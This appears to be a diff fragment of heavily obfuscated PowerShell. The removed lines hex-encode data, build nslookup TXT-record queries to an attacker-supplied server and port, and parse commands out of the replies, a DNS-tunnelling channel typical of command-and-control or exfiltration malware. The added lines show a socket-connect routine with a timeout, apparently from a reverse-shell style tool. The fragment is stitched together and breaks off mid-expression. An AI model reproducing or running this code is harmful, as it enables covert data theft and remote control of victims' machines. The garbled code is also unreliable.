-      $p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE = @()
- $XFCwQi9jTTwJekUSINtH9PHy7upEjKzdr2qkW5NU0ix4xvngyxkxMtW85N7GKC0VOrmgHRTi4NXcCrUIM9x2CXMUfUxmWwpIH4tjwlo4MnwgI0V5RtBezaWhmOSaLZeXv8EwiaLPzAb5i2BkGGHKl8S7qOTobtn7PadlyV0DESerhoBdoCHiUuMY5tffV6G1Ew6O9rp83lDZRhtGNdJ8LE3A3okA2qAxngfSUvWegREft3AmHZVGYTALcrA02aifGAGNnH2qgj4yu0Uh9UwZMZfpRsnep9QrjRs0WaYPpZm20o0L2qJD6nw23FVL7l4XHNROKxzcZMw4qmqFAZN5AFoONXTPEtpIpLU3S3i2ztRpNJU51NMVNgPRvApQAQQnttE8PjZfg3isKiSOw0UhHKYx2faniFGceTanmWWlZbsJ1mvNK9GCFqClSCkX4f7JnVpfNjp65DW7SiwY1s5V7uOEahVYARkVd6zjPyRQN4xAyTSFnCIlPtliKTAWcKX3uVtDcr62PODOqtDqgbs79H5Aw4cbMhW7SmmSypN6kq2x4wMZIYLFFJiksb91A4oEErF66hBn7fEK4GhcAgm4ZUf6dgDqd2jFHZ3WPgg.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE += $_}
-       return $p38SEfS9HgiGqAZbRXR8EpKKKNJrWR18gHcuuIq7UStIFblloC7gqd8EBsxBvw13sfinfwzsn9CmEcMGM3AOdnt16m0UzLOP5tUXKAKHH8B6aWSvNSjerzkF6oAJbDbZIuAjQTnu3kBHFAPzmBOt0AFqe2CpucblYZEjgP3mh93TMrWgHZ5UCA8TXMsSwEbvLQPv9bqX9rt6H1VuYMqtzFjd4eEaahuFlySgJKWwcBzuOLI9ysVTuYJVn0VErKrwf1YmUvaDIsPKgL8ebBRrjyyRmMDEzkc47PVNpOfWjWkB6wGVwX2mqkqe7wxSZ7X2qRItjHxhhmZ7Khjqiv5fXfgzT3TSLXgEZHTejU2WUQkhLAmrmbukCcG1TjvxGpM1aemdeELWKelAwAQOcVUBvDrT8VE6OVDitqmQwgGB8lLaxsOmJB3PFQn0YOqce2ZjAfPRCJCaZyoUzUmhHaGzZ9brmVvZth9hOmts9Hi2j76ZoCOwucPP2dj5a7iBM1PhIdrF3zML3XvxFXgk8LCVb4EBOwCb8RADRKaInDOpTroygmRmjHhCHA0XSr35Uo5iZ7kv74nDWu5D2xyJYiaeqnN806y2DURKQTEhfAljKxw7ypcrkoDnfF6TNiFynGCJB0b84BtN0geqm9gENixMuYnHf5Ehe5CgjgBD1eA8gswqWl1RGRtBGCJ1pIzEGUQiE
- }
-     
-function pjTtflJoIPIxJgDBhfkqEUDOqoqTiKotzUzjfVrWA
- {
- param($qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT,$7N0ISxeIda3EelBbrUXVp5tpXCmuZeyAY9hgDxJEcj4E96asoVoyeCLv8aOEpWbQxeZJBSH3j0fJQRLwQvdyyMMN5cWGn4wFSbjXSK7dcmoqSuP3TzErGxtr4aNYo7mziF8mmDikp3VkkR8dAXjpsUKAOfbrYaLYjDTydYpeyTGhCpnogYMxt36cF1b2cpuZnzsrBOiB9Culdg1mIaOH1PfPTMY4TlaBsi9zcVGcCTpzw2M7dtgIaEYAs1BILGJHZeuFawOwhP6x1dzautDSwo0sTpMcEsf8nNqa8WdW0gV8YlGBvNo17Q1rGCi4Ve7VVX7cbOCtMSSQxfQpUegNx4lcsVIXvC8cGijmH0kL3q2uhJZR2AESvUYPT13e3z4n5lzLhMjX33ABplarjHTizTjIRhKplBcLWobDgedw5HgOjLEh9dNgrCVGHkxrZuZuh2FzWWP2tWI85yyVNvx0qjJWEnUa3Wd3PpOFM1gdQo485KFDBLGCNwzkk7YfYHr6Zpskaptj58qk,$NfhO6ApAvxBhPmNYQMUY1B7ikHJTn4ENRBq)
-  $YakWhi0lq6TcvYoOC8z8yVyeWGcBvVmEVaeYTSjMOWF7xgopNLTHuFt4383KH6rq26FJXtfTmlx7e6aw0u0NUVkKIS5YerRAnmYsI2VpYidrQS5GGKvuRiRjBWaOUpKyfodH3ddIMQwZazIsAtYE2ld9LlVzwdRsTG6KFECEosKx9nMJh1w4WwYVKUIBNCryL46uauFlv4szaN0PYQsGasQihxTjgc1NEdbDdxVD24mxjMyZ332VxQSw2TQrIGzi49M7PihkrX5k9OB7jmjOJEwzFzVCtJpK8Ix9nn3Vh4QNhaUOp7ziC2zQqXcNznesNVLfoSekT3x1WLQ3ljwXZdAr9J6vD97lOcXYIdr6VtbYzlzR7Mrw2wLOm36zi5x6G0W7yl2MQIE0WlWMBF5HCFVnO5gLaczfHJvCmYOhqjQINqvtXdplPLPcnlpcbpI6wOmqJwbWG2K6nrx5tutCC1vkjPiYAP69lI047YrwjRx4zY5lPGFOiGU2bjGsUdDZAswnTalSLAcU6pKB17l5yLVdJAZ1aSo9Onvi0iyCBjWX1qSV2XoN7Idjwa0aBZQctsiQC3MpCC6gloSALLLO47AfDStxcjuklVu8K55bbuc2ihgt9WqAuVG36GRaVmFlQvQvzclKBMuCad4z7gym2oYET0yAmJ9jp6urPdrPlmavxfr6ZshLqQkMQBP8rRuuv = ("set type=TXT`nserver $7N0ISxeIda3EelBbrUXVp5tpXCmuZeyAY9hgDxJEcj4E96asoVoyeCLv8aOEpWbQxeZJBSH3j0fJQRLwQvdyyMMN5cWGn4wFSbjXSK7dcmoqSuP3TzErGxtr4aNYo7mziF8mmDikp3VkkR8dAXjpsUKAOfbrYaLYjDTydYpeyTGhCpnogYMxt36cF1b2cpuZnzsrBOiB9Culdg1mIaOH1PfPTMY4TlaBsi9zcVGcCTpzw2M7dtgIaEYAs1BILGJHZeuFawOwhP6x1dzautDSwo0sTpMcEsf8nNqa8WdW0gV8YlGBvNo17Q1rGCi4Ve7VVX7cbOCtMSSQxfQpUegNx4lcsVIXvC8cGijmH0kL3q2uhJZR2AESvUYPT13e3z4n5lzLhMjX33ABplarjHTizTjIRhKplBcLWobDgedw5HgOjLEh9dNgrCVGHkxrZuZuh2FzWWP2tWI85yyVNvx0qjJWEnUa3Wd3PpOFM1gdQo485KFDBLGCNwzkk7YfYHr6Zpskaptj58qk`nset port=$NfhO6ApAvxBhPmNYQMUY1B7ikHJTn4ENRBq`nset domain=.com`nset retry=1`n" + $qGX77HJA9dJw6VV3q11LTqoCAEzHNzy8LQ7VCxhlPpznDqxqx6ztauSkeqchMikQuHqRgofmyDmEHpwK2HPIGDitYOKuOC5OlHTAAEWxYHLwClCGwE4qmW0GX0h08KbZHaXYnu8iFDMZ06Xor0cDAXvgtLOmnYkKHAy4kVzr4DpifTx9nHK4RUs66qfwnYaknzITBOtmNVoB9tcEiQPMb9Jmog17wlbCl6gViJH0xrdgCOjVOxL4qOvScHGMXK9fibhzofqrOfZtSm0dSFGlkIfAJz7PeanumbJhBTeL9BXaUDfeSWl5KvHKq3njIyNvgVLNxmwYBAemGjgbNQU5vIHN0ZeRWffOxOflikVTtT + "`nexit")
-$4ee2mDHlIFx6Kr4ih8LNDAHNl4flM3UkEsYfOsoDTk5hCgjHJxpifsHZ4qH0ydRavMbLQbah7jSFmDISfqSyJCqVcADsJ71yTC02sz1PEOmPNvClYwjXnFQgmz5hCVQIT320dWtIP0OcyrkDfbHstSTLMLOvYcZ0q06Ta9hcMnPDFcrEmywdshDO6YJOVLgHx9vPGDQ936vGOdBXNrLD2hrMrnMeHxfjkCtTF1OXuZp6b7Qag5pRNKQf6E05dyJOciDq3I14ltdoikjYfzFJJIardIFtxQCH1l42JjOqVYHiLzNTYM2QUC2zozKETBVAPIPXxFQGnF3btaQ5 = ($YakWhi0lq6TcvYoOC8z8yVyeWGcBvVmEVaeYTSjMOWF7xgopNLTHuFt4383KH6rq26FJXtfTmlx7e6aw0u0NUVkKIS5YerRAnmYsI2VpYidrQS5GGKvuRiRjBWaOUpKyfodH3ddIMQwZazIsAtYE2ld9LlVzwdRsTG6KFECEosKx9nMJh1w4WwYVKUIBNCryL46uauFlv4szaN0PYQsGasQihxTjgc1NEdbDdxVD24mxjMyZ332VxQSw2TQrIGzi49M7PihkrX5k9OB7jmjOJEwzFzVCtJpK8Ix9nn3Vh4QNhaUOp7ziC2zQqXcNznesNVLfoSekT3x1WLQ3ljwXZdAr9J6vD97lOcXYIdr6VtbYzlzR7Mrw2wLOm36zi5x6G0W7yl2MQIE0WlWMBF5HCFVnO5gLaczfHJvCmYOhqjQINqvtXdplPLPcnlpcbpI6wOmqJwbWG2K6nrx5tutCC1vkjPiYAP69lI047YrwjRx4zY5lPGFOiGU2bjGsUdDZAswnTalSLAcU6pKB17l5yLVdJAZ1aSo9Onvi0iyCBjWX1qSV2XoN7Idjwa0aBZQctsiQC3MpCC6gloSALLLO47AfDStxcjuklVu8K55bbuc2ihgt9WqAuVG36GRaVmFlQvQvzclKBMuCad4z7gym2oYET0yAmJ9jp6urPdrPlmavxfr6ZshLqQkMQBP8rRuuv | nslookup 2>&1 | Out-String)
-  if($4ee2mDHlIFx6Kr4ih8LNDAHNl4flM3UkEsYfOsoDTk5hCgjHJxpifsHZ4qH0ydRavMbLQbah7jSFmDISfqSyJCqVcADsJ71yTC02sz1PEOmPNvClYwjXnFQgmz5hCVQIT320dWtIP0OcyrkDfbHstSTLMLOvYcZ0q06Ta9hcMnPDFcrEmywdshDO6YJOVLgHx9vPGDQ936vGOdBXNrLD2hrMrnMeHxfjkCtTF1OXuZp6b7Qag5pRNKQf6E05dyJOciDq3I14ltdoikjYfzFJJIardIFtxQCH1l42JjOqVYHiLzNTYM2QUC2zozKETBVAPIPXxFQGnF3btaQ5.Contains('"')){return ([regex]::Match($4ee2mDHlIFx6Kr4ih8LNDAHNl4flM3UkEsYfOsoDTk5hCgjHJxpifsHZ4qH0ydRavMbLQbah7jSFmDISfqSyJCqVcADsJ71yTC02sz1PEOmPNvClYwjXnFQgmz5hCVQIT320dWtIP0OcyrkDfbHstSTLMLOvYcZ0q06Ta9hcMnPDFcrEmywdshDO6YJOVLgHx9vPGDQ936vGOdBXNrLD2hrMrnMeHxfjkCtTF1OXuZp6b7Qag5pRNKQf6E05dyJOciDq3I14ltdoikjYfzFJJIardIFtxQCH1l42JjOqVYHiLzNTYM2QUC2zozKETBVAPIPXxFQGnF3btaQ5.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
-  else{return 1}
-  }
- 
-  function QAUTThuKEwOxlfkxJMpajbDjEYjimrMDbmYvKnzoJ
+          $FuncVars["Socket"].Close()
+          $Stopwatch.Stop()
+          Write-Verbose "Timeout!" ; break
+        }
+        if($ConnectHandle.IsCompleted)
         {
- param($LreeEBLfxTUGpjUCl0FFTEfPptZdo9pGE0sGhVmYJBHheuKn4p13hH9Dl3ReA84eneyKU3IBKUDyOhzriMBdak42ucIGolhdaBvaXYcjGJPKXuocw4AvsyWqW3dNRdnJsRiNc0zlaHHjKd1TKs6jce6otSLSgRG0kMgKdIR09ecFNpApToacjab3VE0txlzTnslzMVWpC8ODrvN80FtZBUwI7RtlDswG3n4GFS1Gmj4xURFZDA08w1r0J7Ucd5yVOjFprDKAlFrOqsaBLJR0QVr5rJcHsqArD2YjJ1XByQ4YMF0cPBaAtpGj5O0gUvxid6K6hKoiddQii8wDCfWvvnRmfGtWTk24DrGpe08mFySNnKtHKLLe0trrVUIFyqKqRquam6aSeyPCFD7MviiPMgY04qLaHIrcVgOuXqUh4lcyHCLAPHGWLbOUGCox6bWSFU2k2RkDpqpq0PiIjMMr6xEic7nUZSJNNusqxq4AsJwQDlS8Mg6TjY8gtq8pR8bsDzobNmfqkCFWSnhmQMiVv84H9n6Etv4D7ZCG72UKNo9iXjMQ3rthaZvkKTmvh1SLyhlplbNgC6h8P9OLvnYuKEDwgkj415QLD35807StS24xFaLS4fROjCD1mvIkRmb7kUJaZ8K8JJ4IdwhtcYa9kT6HsFAuNqsVPFk7p60cqQkXicLSkOJ50TrB8GaCNtGQb4g,$kVCChx0Yx3QylODepx2SHJ7e4DBTplQHrlmeWbFwDLUBmnhlp2jLK494qufM1i9puqfKZmTi1QoejPRRGESUeIRSisDGtczsX6PIO1C2mhwr11tgizpOu9T3kGyamyljT47i8Ib8WLhP9OSrwZGFXmQUJ9yLx02KuMSTblMVkNuSHGAAulm4RmrQV7L2Sb7KwS6wE,$bWyo8G5hjWTAkrDxFDhWkYAZW8ZGcQTA05aWrkzp8xgi5JUTx9iZJLVZJqlXUrmVj0gCE6STw8DxjzTpamIfT4kESEWObuVJyzkOnhXQEJArkWxaAxZhrW0FENDnXm766uFe9YKdgbCQjhtBlY4dUhD9PGkWoLvR3juKLBgMgfe6FrWQ2ZupzLgoaSTjeXAUAPTTHdX5YmFWit7na3j9XSwlEJhM3Dk8FxLChl70vFKvCITviMykLqkTcjIDuN7FWy0bqJFvPkWrTD3FktgC1kaDQWmLRYMF6P66T0ak3ZjdgWLS29k2AcpRIyaOtIqxFtj259r4GrRrt2gmywrMKdQETNwWpGpTV0eDQkkVyqEoPtodccwZPIDjdn1xqSfioI3I16rjxTcwUvKeWluf6u8uWNUWuGuby9KoL6v8wKyQ3FgGeJU3V2iaXwLVwVu8FWcojJJRb6c25wyC2RmUj3nvIYic1CapEkQWCjeGi0adRzuCTEDkh3JiWNozsMdb4nNfEgYW7TIZG5rsZ8rcd1GX5G6zM58JhNXU97XW4XM1rW0JM4bH4icAmz5t6kslX2cegFQCD6Req02Ub5U79Jb6Xs2cXGkWOcIvcWPytLnY0ZpiPbpnkfTaLiy1jeRFGYvgYjA2V91ZbXSNOUgbnDMAzXJCOoZ8ZIQS1d8bqf7yUWTARZPH9lE9yrfQ7nRLMT7UhDq931CfgP256PYFroSI89yqn1vse5Bwnonq8wwlz8RNuYHgzSJGxEDzJYHhwG520Eg2Y7CPrAmWRT7dAkZPrxpvYSBfW1cpa8BnjJFAXqClMIlQtf6O3gm5Wb6XjXB3lyjoM8K6JAFMqjhReScubfQwB,$zbmVENyLwyevsEbTxcOU4tpRd5P3Q7ZhBc7YhYGZ2sdE9zYfPjibNpqpChVwRekyWcEzehVQByRwrE4AoAgrQOUxZZ9zNSxEvtTbmvYA7KfJDkwdJUN7qUPjYlmYNMInjLTU7dOqs1TLiv4fn1SwUlo8Ty7DJqaZzP5R3C24LvTCWq94alwaNOgImLg1vP4I0iywO0iuQ5oC1CpHQsU031Ov4QuwiRJvHrqpPPkW2wOu3uJ9G8scpKDVIlBTUDexQCM4TT08Bm3IS4lyBwJwnji8Ijih5hpX8DSDlC8YrwkISydexVshMmPGpXr0aAB9LZC2lBAmZ0RkzHRjnXFbjFINiP93ZehGk2XwI93wKquW43Sm1VZUOU3zEBlpMbuMP3CGPypTaq2zJRfRRg7HVZsb12acanea8sY1XilClO9sbukxK9Dxz4VJnnSkH9iSsBgq8G0kI3cUNwdK2DwjcnsT1bUk0rsED5PbUzM9TSXIwq3hjCqW5ydfkwCgjQw059Yaa0WnJ0JOx4UQ8Q6UdC4mtGVULLHfgayvHaL0P6UAWCquY2Vj0dN4aMxrW3OC3eWHS0H9mGwFQbc7pJaoWWJ8s6NRjQ7QAhSesJtgK8ap8XePqOPxJO8)
-         return ($bWyo8G5hjWTAkrDxFDhWkYAZW8ZGcQTA05aWrkzp8xgi5JUTx9iZJLVZJqlXUrmVj0gCE6STw8DxjzTpamIfT4kESEWObuVJyzkOnhXQEJArkWxaAxZhrW0FENDnXm766uFe9YKdgbCQjhtBlY4dUhD9PGkWoLvR3juKLBgMgfe6FrWQ2ZupzLgoaSTjeXAUAPTTHdX5YmFWit7na3j9XSwlEJhM3Dk8FxLChl70vFKvCITviMykLqkTcjIDuN7FWy0bqJFvPkWrTD3FktgC1kaDQWmLRYMF6P66T0ak3ZjdgWLS29k2AcpRIyaOtIqxFtj259r4GrRrt2gmywrMKdQETNwWpGpTV0eDQkkVyqEoPtodccwZPIDjdn1xqSfioI3I16rjxTcwUvKeWluf6u8uWNUWuGuby9KoL6v8wKyQ3FgGeJU3V2iaXwLVwVu8FWcojJJRb6c25wyC2RmUj3nvIYic1CapEkQWCjeGi0adRzuCTEDkh3JiWNozsMdb4nNfEgYW7TIZG5rsZ8rcd1GX5G6zM58JhNXU97XW4XM1rW0JM4bH4icAmz5t6kslX2cegFQCD6Req02Ub5U79Jb6Xs2cXGkWOcIvcWPytLnY0ZpiPbpnkfTaLiy1jeRFGYvgYjA2V91ZbXSNOUgbnDMAzXJCOoZ8ZIQS1d8bqf7yUWTARZPH9lE9yrfQ7nRLMT7UhDq931CfgP256PYFroSI89yqn1vse5Bwnonq8wwlz8RNuYHgzSJGxEDzJYHhwG520Eg2Y7CPrAmWRT7dAkZPrxpvYSBfW1cpa8BnjJFAXqClMIlQtf6O3gm5Wb6XjXB3lyjoM8K6JAFMqjhReScubfQwB + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $LreeEBLfxTUGpjUCl0FFTEfPptZdo9pGE0sGhVmYJBHheuKn4p13hH9Dl3ReA84eneyKU3IBKUDyOhzriMBdak42ucIGolhdaBvaXYcjGJPKXuocw4AvsyWqW3dNRdnJsRiNc0zlaHHjKd1TKs6jce6otSLSgRG0kMgKdIR09ecFNpApToacjab3VE0txlzTnslzMVWpC8ODrvN80FtZBUwI7RtlDswG3n4GFS1Gmj4xURFZDA08w1r0J7Ucd5yVOjFprDKAlFrOqsaBLJR0QVr5rJcHsqArD2YjJ1XByQ4YMF0cPBaAtpGj5O0gUvxid6K6hKoiddQii8wDCfWvvnRmfGtWTk24DrGpe08mFySNnKtHKLLe0trrVUIFyqKqRquam6aSeyPCFD7MviiPMgY04qLaHIrcVgOuXqUh4lcyHCLAPHGWLbOUGCox6bWSFU2k2RkDpqpq0PiIjMMr6xEic7nUZSJNNusqxq4AsJwQDlS8Mg6TjY8gtq8pR8bsDzobNmfqkCFWSnhmQMiVv84H9n6Etv4D7ZCG72UKNo9iXjMQ3rthaZvkKTmvh1SLyhlplbNgC6h8P9OLvnYuKEDwgkj415QLD35807StS24xFaLS4fROjCD1mvIkRmb7kUJaZ8K8JJ4IdwhtcYa9kT6HsFAuNqsVPFk7p60cqQkXicLSkOJ50TrB8GaCNtGQb4g + $kVCChx0Yx3QylODepx2SHJ7e4DBTplQHrlmeWbFwDLUBmnhlp2jLK494qufM1i9puqfKZmTi1QoejPRRGESUeIRSisDGtczsX6PIO1C2mhwr11tgizpOu9T3kGyamyljT47i8Ib8WLhP9OSrwZGFXmQUJ9yLx02KuMSTblMVkNuSHGAAulm4RmrQV7L2Sb7KwS6wE + "0000" + $zbmVENyLwyevsEbTxcOU4tpRd5P3Q7ZhBc7YhYGZ2sdE9zYfPjibNpqpChVwRekyWcEzehVQByRwrE4AoAgrQOUxZZ9zNSxEvtTbmvYA7KfJDkwdJUN7qUPjYlmYNMInjLTU7dOqs1TLiv4fn1SwUlo8Ty7DJqaZzP5R3C24LvTCWq94alwaNOgImLg1vP4I0iywO0iuQ5oC1CpHQsU031Ov4QuwiRJvHrqpPPkW2wOu3uJ9G8scpKDVIlBTUDexQCM4TT08Bm3IS4lyBwJwnji8Ijih5hpX8DSDlC8YrwkISydexVshMmPGpXr0aAB9LZC2lBAmZ0RkzHRjnXFbjFINiP93ZehGk2XwI93wKquW43Sm1VZUOU3zEBlpMbuMP3CGPypTaq2zJRfRRg7HVZsb12acanea8sY1XilClO9sbukxK9Dxz4VJnnSkH9iSsBgq8G0kI3cUNwdK2DwjcnsT1bUk0rsED5PbUzM9TSXIwq3hjCqW5ydfkwCgjQw059Yaa0WnJ0JOx4UQ8Q6UdC4mtGVULLHfgayvHaL0P6UAWCquY2Vj0dN4aMxrW3OC3eWHS0H9mGwFQbc7pJaoWWJ8s6NRjQ7QAhSesJtgK8ap8XePqOPxJO8)
-       }
- 
- function uxiZVJEdjIpSqbwHWrkBqwoHnfnhXrHiuTqRERlvn
-{
-     param($LreeEBLfxTUGpjUCl0FFTEfPptZdo9pGE0sGhVmYJBHheuKn4p13hH9Dl3ReA84eneyKU3IBKUDyOhzriMBdak42ucIGolhdaBvaXYcjGJPKXuocw4AvsyWqW3dNRdnJsRiNc0zlaHHjKd1TKs6jce6otSLSgRG0kMgKdIR09ecFNpApToacjab3VE0txlzTnslzMVWpC8ODrvN80FtZBUwI7RtlDswG3n4GFS1Gmj4xURFZDA08w1r0J7Ucd5yVOjFprDKAlFrOqsaBLJR0QVr5rJcHsqArD2YjJ1XByQ4YMF0cPBaAtpGj5O0gUvxid6K6hKoiddQii8wDCfWvvnRmfGtWTk24DrGpe08mFySNnKtHKLLe0trrVUIFyqKqRquam6aSeyPCFD7MviiPMgY04qLaHIrcVgOuXqUh4lcyHCLAPHGWLbOUGCox6bWSFU2k2RkDpqpq0PiIjMMr6xEic7nUZSJNNusqxq4AsJwQDlS8Mg6TjY8gtq8pR8bsDzobNmfqkCFWSnhmQMiVv84H9n6Etv4D7ZCG72UKNo9iXjMQ3rthaZvkKTmvh1SLyhlplbNgC6h8P9OLvnYuKEDwgkj415QLD35807StS24xFaLS4fROjCD1mvIkRmb7kUJaZ8K8JJ4IdwhtcYa9kT6HsFAuNqsVPFk7p60cqQkXicLSkOJ50TrB8GaCNtGQb4g,$bWyo8G5hjWTAkrDxFDhWkYAZW8ZGcQTA05aWrkzp8xgi5JUTx9iZJLVZJqlXUrmVj0gCE6STw8DxjzTpamIfT4kESEWObuVJyzkOnhXQEJArkWxaAxZhrW0FENDnXm766uFe9YKdgbCQjhtBlY4dUhD9PGkWoLvR3juKLBgMgfe6FrWQ2ZupzLgoaSTjeXAUAPTTHdX5YmFWit7na3j9XSwlEJhM3Dk8FxLChl70vFKvCITviMykLqkTcjIDuN7FWy0bqJFvPkWrTD3FktgC1kaDQWmLRYMF6P66T0ak3ZjdgWLS29k2AcpRIyaOtIqxFtj259r4GrRrt2gmywrMKdQETNwWpGpTV0eDQkkVyqEoPtodccwZPIDjdn1xqSfioI3I16rjxTcwUvKeWluf6u8uWNUWuGuby9KoL6v8wKyQ3FgGeJU3V2iaXwLVwVu8FWcojJJRb6c25wyC2RmUj3nvIYic1CapEkQWCjeGi0adRzuCTEDkh3JiWNozsMdb4nNfEgYW7TIZG5rsZ8rcd1GX5G6zM58JhNXU97XW4XM1rW0JM4bH4icAmz5t6kslX2cegFQCD6Req02Ub5U79Jb6Xs2cXGkWOcIvcWPytLnY0ZpiPbpnkfTaLiy1jeRFGYvgYjA2V91ZbXSNOUgbnDMAzXJCOoZ8ZIQS1d8bqf7yUWTARZPH9lE9yrfQ7nRLMT7UhDq931CfgP256PYFroSI89yqn1vse5Bwnonq8wwlz8RNuYHgzSJGxEDzJYHhwG520Eg2Y7CPrAmWRT7dAkZPrxpvYSBfW1cpa8BnjJFAXqClMIlQtf6O3gm5Wb6XjXB3lyjoM8K6JAFMqjhReScubfQwB,$zbmVENyLwyevsEbTxcOU4tpRd5P3Q7ZhBc7YhYGZ2sdE9zYfPjibNpqpChVwRekyWcEzehVQByRwrE4AoAgrQOUxZZ9zNSxEvtTbmvYA7KfJDkwdJUN7qUPjYlmYNMInjLTU7dOqs1TLiv4fn1SwUlo8Ty7DJqaZzP5R3C24LvTCWq94alwaNOgImLg1vP4I0iywO0iuQ5oC1CpHQsU031Ov4QuwiRJvHrqpPPkW2wOu3uJ9G8scpKDVIlBTUDexQCM4TT08Bm3IS4lyBwJwnji8Ijih5hpX8DSDlC8YrwkISydexVshMmPGpXr0aAB9LZC2lBAmZ0RkzHRjnXFbjFINiP93ZehGk2XwI93wKquW43Sm1VZUOU3zEBlpMbuMP3CGPypTaq2zJRfRRg7HVZsb12acanea8sY1XilClO9sbukxK9Dxz4VJnnSkH9iSsBgq8G0kI3cUNwdK2DwjcnsT1bUk0rsED5PbUzM9TSXIwq3hjCqW5ydfkwCgjQw059Yaa0WnJ0JOx4UQ8Q6UdC4mtGVULLHfgayvHaL0P6UAWCquY2Vj0dN4aMxrW3OC3eWHS0H9mGwFQbc7pJaoWWJ8s6NRjQ7QAhSesJtgK8ap8XePqOPxJO8)
-return ($bWyo8G5hjWTAkrDxFDhWkYAZW8ZGcQTA05aWrkzp8xgi5JUTx9iZJLVZJqlXUrmVj0gCE6STw8DxjzTpamIfT4kESEWObuVJyzkOnhXQEJArkWxaAxZhrW0FENDnXm766uFe9YKdgbCQjhtBlY4dUhD9PGkWoLvR3juKLBgMgfe6FrWQ2ZupzLgoaSTjeXAUAPTTHdX5YmFWit7na3j9XSwlEJhM3Dk8FxLChl70vFKvCITviMykLqkTcjIDuN7FWy0bqJFvPkWrTD3FktgC1kaDQWmLRYMF6P66T0ak3ZjdgWLS29k2AcpRIyaOtIqxFtj259r4GrRrt2gmywrMKdQETNwWpGpTV0eDQkkVyqEoPtodccwZPIDjdn1xqSfioI3I16rjxTcwUvKeWluf6u8uWNUWuGuby9KoL6v8wKyQ3FgGeJU3V2iaXwLVwVu8FWcojJJRb6c25wyC2RmUj3nvIYic1CapEkQWCjeGi0adRzuCTEDkh3JiWNozsMdb4nNfEgYW7TIZG5rsZ8rcd1GX5G6zM58JhNXU97XW4XM1rW0JM4bH4icAmz5t6kslX2cegFQCD6Req02Ub5U79Jb6Xs2cXGkWOcIvcWPytLnY0ZpiPbpnkfTaLiy1jeRFGYvgYjA2V91ZbXSNOUgbnDMAzXJCOoZ8ZIQS1d8bqf7yUWTARZPH9lE9yrfQ7nRLMT7UhDq931CfgP256PYFroSI89yqn1vse5Bwnonq8wwlz8RNuYHgzSJGxEDzJYHhwG520Eg2Y7CPrAmWRT7dAkZPrxpvYSBfW1cpa8BnjJFAXqClMIlQtf6O3gm5Wb6XjXB3lyjoM8K6JAFMqjhReScubfQwB + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + 